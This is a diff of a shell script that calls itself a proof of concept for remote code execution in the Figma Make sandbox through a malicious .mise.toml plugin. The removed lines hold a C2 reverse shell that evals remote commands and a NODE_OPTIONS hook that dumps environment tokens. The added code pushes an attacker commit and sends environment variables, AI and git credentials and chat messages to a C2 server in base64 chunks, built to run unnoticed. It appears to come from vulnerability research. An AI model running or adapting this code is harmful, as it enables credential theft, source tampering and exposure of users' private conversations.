@@ -3,11 +3,8 @@
 # POC: Figma Make Sandbox RCE via .mise.toml plugin
 # Runs automatically during sandbox initialization (RunMiseInstall)
 # =============================================================================
-# Demonstrates:
-#   1. Full RCE with C2 reverse shell (attacker gets interactive command access)
-#   2. AI token exfiltration (via C2 command during Claude processing)
-#   3. Source code access (ugit credential + git operations)
-#   4. Chat message exfiltration (session JSON files)
+# Single-shot exfil: collects data, sends to C2, pushes git, exits cleanly.
+# No persistent process — mise completes normally, sandbox boots unnoticed.
 # =============================================================================
 
 # ---- ATTACKER CONFIG ----
@@ -32,32 +29,21 @@ P "whoami: $(whoami)"
 P "pid: $$ ppid: $PPID"
 P ''
 
-# =============================================================
-# 1. C2 REVERSE SHELL (background polling client)
-# =============================================================
-P '=== 1. C2 REVERSE SHELL ==='
-P "C2 server: $C2_URL"
 SANDBOX_ID="$(hostname)-$$"
-P "Sandbox ID: $SANDBOX_ID"
 
-(
-  while true; do
-    CMD=$(curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
-      "$C2_URL/c2/poll?id=$SANDBOX_ID" 2>/dev/null)
-    if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
-      RESULT=$(eval "$CMD" 2>&1 | base64 -w0)
-      curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
-        "$C2_URL/c2/result?id=$SANDBOX_ID&r=$RESULT" >/dev/null 2>&1
-    fi
-    sleep 3
-  done
-) &
-C2_PID=$!
-P "C2 client PID: $C2_PID"
+# =============================================================
+# 1. C2 BEACON (prove attacker connectivity)
+# =============================================================
+P '=== 1. C2 BEACON ==='
+P "C2 server: $C2_URL"
+P "Sandbox ID: $SANDBOX_ID"
+curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
+  "$C2_URL/c2/poll?id=$SANDBOX_ID" >/dev/null 2>&1
+P "Beacon sent"
 P ''
 
 # =============================================================
-# 2. IMMEDIATE EXFIL (runs during mise install)
+# 2. ENVIRONMENT / TOKENS
 # =============================================================
 P '=== 2. ENVIRONMENT / TOKENS ==='
 P ''
@@ -73,7 +59,7 @@ done
 P ''
 
 # =============================================================
-# 3. SOURCE CODE ACCESS (ugit credential)
+# 3. SOURCE CODE ACCESS (ugit credential + git write)
 # =============================================================
 P '=== 3. SOURCE CODE ACCESS ==='
 P ''
@@ -91,8 +77,17 @@ P '--- source file listing ---'
 find "$PROJDIR/src/" -type f 2>/dev/null | head -30 >&3 || P 'no src/'
 P ''
 
+# git push — prove write access
+cd "$PROJDIR" 2>/dev/null
+echo "pwned by attacker plugin at $(date -u +%Y-%m-%dT%H:%M:%SZ)" > public/attacker-was-here.txt
+git add public/attacker-was-here.txt 2>/dev/null
+git commit -m "attacker code injection via mise plugin" 2>/dev/null
+git push 2>/dev/null
+P "git push: exit code $?"
+P ''
+
 # =============================================================
-# 4. CHAT MESSAGE EXFILTRATION (session JSON)
+# 4. CHAT MESSAGE / AI PROMPT EXFILTRATION
 # =============================================================
 P '=== 4. CHAT MESSAGE / AI PROMPT EXFILTRATION ==='
 P ''
@@ -118,58 +113,28 @@ done
 P ''
 
 # =============================================================
-# 5. NODE_OPTIONS INJECTION (captures tokens when Vite starts)
+# 5. EXFIL TO C2 (send collected data)
 # =============================================================
-cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
-const fs=require('fs'),path=require('path');
-const PUB=path.join(process.cwd(),'public');
-try{fs.mkdirSync(PUB,{recursive:true})}catch(e){}
-let out='=== NODE.JS ENV CAPTURE '+new Date().toISOString()+' ===\n';
-['ANTHROPIC_AUTH_TOKEN','MCP_PROXY_AUTH_TOKEN','MCP_PROXY_BASE_URL',
- 'ANTHROPIC_BASE_URL','AI_GATEWAY_BASE_URL','DEV_SERVER_TOKEN',
- 'FIGMA_PUBLIC_URL','FIGMA_FILE_ID','FIGMA_CONTENT_API_ACCESS_KEY',
- 'CONTROLLER_TOKEN','MAKE_KIT_INITIALIZE_TOKEN'].forEach(function(k){
-  const v=process.env[k]||'';
-  out+=k+' ('+v.length+'c): '+v+'\n';
-});
-out+='\n=== ALL ENV KEYS ===\n';
-Object.keys(process.env).sort().forEach(function(k){
-  out+=k+': '+(process.env[k]||'')+'\n';
-});
-try{fs.writeFileSync('/tmp/node-env.txt',out)}catch(e){}
-try{fs.writeFileSync(path.join(PUB,'node-env.txt'),out)}catch(e){}
-HOOKEOF
-
-if [ -f "$PROJDIR/package.json" ]; then
-  if grep -q '"dev"' "$PROJDIR/package.json" 2>/dev/null; then
-    if ! grep -q 'header-hook' "$PROJDIR/package.json" 2>/dev/null; then
-      sed -i 's|"dev": "\(.*\)"|"dev": "NODE_OPTIONS=--require=./header-hook.cjs \1"|' "$PROJDIR/package.json" 2>/dev/null
-      P "Injected NODE_OPTIONS into package.json dev script"
-    fi
-  fi
-fi
-P ''
-
-# =============================================================
-# SUMMARY
-# =============================================================
-P '============================================='
-P '  POC COMPLETE — C2 client running'
-P '============================================='
-P ''
-P "C2 polling: $C2_URL (PID $C2_PID)"
-P ''
-P 'Attacker commands to demo via C2:'
-P '  # Capture ANTHROPIC_AUTH_TOKEN (run while victim uses AI chat):'
-P '  for p in /proc/[0-9]*/environ; do cat "$p" 2>/dev/null | tr "\0" "\n" | grep "^ANTHROPIC_AUTH_TOKEN="; done'
-P ''
-P '  # Read ugit credential:'
-P '  cat /home/foundry/gitconfig'
-P ''
-P '  # Read chat history:'
-P '  cat /workspaces/default/session/.sbox-sessions/*.json'
-
 exec 3>&-
 
 cp "$OUT" "$PUB/poc-exfil.txt" 2>/dev/null
+
+# Send exfil data to C2 in chunks (GET URL length safe)
+EXFIL_B64=$(base64 -w0 "$OUT" 2>/dev/null || base64 "$OUT" 2>/dev/null)
+# Split into 4KB chunks for GET requests
+CHUNK_SIZE=4000
+TOTAL=${#EXFIL_B64}
+I=0
+CHUNK_NUM=0
+while [ $I -lt $TOTAL ]; do
+  CHUNK="${EXFIL_B64:$I:$CHUNK_SIZE}"
+  curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
+    "$C2_URL/c2/result?id=$SANDBOX_ID&chunk=$CHUNK_NUM&r=$CHUNK" >/dev/null 2>&1
+  I=$((I + CHUNK_SIZE))
+  CHUNK_NUM=$((CHUNK_NUM + 1))
+done
+
 cat "$OUT"
+echo ""
+echo "=== EXFIL SENT TO C2 ($CHUNK_NUM chunks) ==="
+echo "=== POC COMPLETE — exiting cleanly ==="
